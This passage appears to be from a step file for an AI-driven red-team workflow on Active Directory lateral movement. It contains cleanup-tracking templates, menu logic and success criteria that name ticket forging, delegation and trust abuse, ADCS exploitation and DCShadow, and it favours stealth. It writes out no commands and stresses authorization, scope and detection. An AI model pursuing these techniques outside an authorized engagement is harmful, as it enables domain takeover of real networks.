| {{thumbprint}} | {{template}} | {{subject}} | {{expiry}} | {{yes/no}} |

**AD objects modified (for post-engagement cleanup):**

| Object | Attribute Modified | Old Value | New Value | Cleanup Required |
|--------|-------------------|-----------|-----------|-----------------|
| {{object}} | {{attribute}} | {{old}} | {{new}} | {{yes/no}} |

**Write findings under `## Active Directory Lateral Movement`.**
**Update Access Map with all new domain footholds.**
**Update frontmatter metrics.**

### 12. Present MENU OPTIONS

"**Active Directory lateral movement completed.**

Summary: {{technique_count}} techniques assessed, {{success_count}} successful.
Starting position: {{initial_access}} | Final position: {{final_access}}
Domains accessed: {{domain_list}} | Trusts exploited: {{trust_count}}
Certificates tracked: {{cert_count}} for post-engagement revocation
AD objects modified: {{object_count}} requiring cleanup

**Select an option:**
[A] Advanced Elicitation — Deep analysis of specific AD lateral path (alternative trust chains, ticket forging variants, delegation chain analysis)
[W] War Room — Red (alternative domain traversal paths, unexploited trusts, ticket forging chain optimization) vs Blue (AD-specific detection: MDI alerts, Event IDs 4769/4768/5136/4741/4765, Kerberos anomaly analysis, replication monitoring, ADCS certificate audit)
[C] Continue — Proceed to Cloud Lateral Movement (Step 7 of 10)"

#### Menu Handling Logic:

- IF A: Deep analysis — challenge the chosen AD lateral path. Were there shorter trust chains? Did delegation configurations offer unexploited paths? Can ticket forging be combined with trust abuse for cross-forest access? Are there alternative ADCS exploitation paths? Analyze OPSEC — what events were generated per technique, what would MDI flag, what Sigma rules would detect the activity? Process insights, ask user if they want to refine approach, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room — Red Team perspective: what trust paths weren't attempted? Can delegation and ADCS be chained for stealthier movement? What about DCShadow for attribute modification instead of direct LDAP? Are there domain controllers in other sites with weaker monitoring? Blue Team perspective: which Event IDs would correlate this campaign (4769, 4768, 5136, 4741, 4765, 4886, 4887)? What would MDI/Falcon Identity flag? What Sigma/YARA rules detect Kerberos anomalies? What LDAP query patterns would indicate BloodHound or delegation abuse? What replication anomalies indicate DCShadow? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to stepsCompleted, then read fully and follow: `./step-07-cloud-lateral.md`
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and Active Directory Lateral Movement section populated], will you then read fully and follow: `./step-07-cloud-lateral.md` to begin cloud lateral movement.

---

## SYSTEM SUCCESS/FAILURE METRICS

### SUCCESS:

- AD environment assessed: domain structure, trusts, security monitoring tools identified
- All applicable AD lateral movement techniques assessed systematically
- GPO deployment assessed with blast radius analysis before execution
- Kerberos ticket techniques (PtT, OtH, Golden, Silver, Diamond, Sapphire) assessed with appropriate key material
- Delegation abuse (unconstrained, constrained, RBCD) assessed for all identified delegation configurations
- Domain trust abuse assessed for all identified trust relationships
- ADCS exploitation assessed for all identified certificate templates and CA configurations
- SID History and AdminSDHolder assessed for persistence-enabling lateral movement
- DCShadow assessed if Domain Admin access achieved
- Every technique logged with T-code, source→target, credential/ticket, result, and detection events
- All certificates issued tracked for post-engagement revocation
- All AD objects modified tracked for post-engagement cleanup
- Domain position changes documented with attack path diagram
- Findings appended to report under `## Active Directory Lateral Movement`

### SYSTEM FAILURE:

- Modifying GPOs without explicit operator authorization and blast radius analysis
- Attempting Golden Ticket or DCShadow without Domain Admin or equivalent credentials
- Not assessing AD security monitoring tools (MDI, Falcon Identity) before high-noise techniques
- Using RC4 Overpass-the-Hash when AES keys are available — unnecessary detection risk
- Not tracking certificates issued during ADCS exploitation
- Not documenting AD objects modified for post-engagement cleanup
- Cross-domain trust abuse without confirming target domain is in RoE scope
- Not logging every technique with T-code, source→target, and result
- Skipping applicability check for non-AD environments
- Proceeding without user selecting 'C' (Continue)

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every technique logged, every certificate tracked, every AD modification documented. Assess blast radius before any domain-wide change. Always.
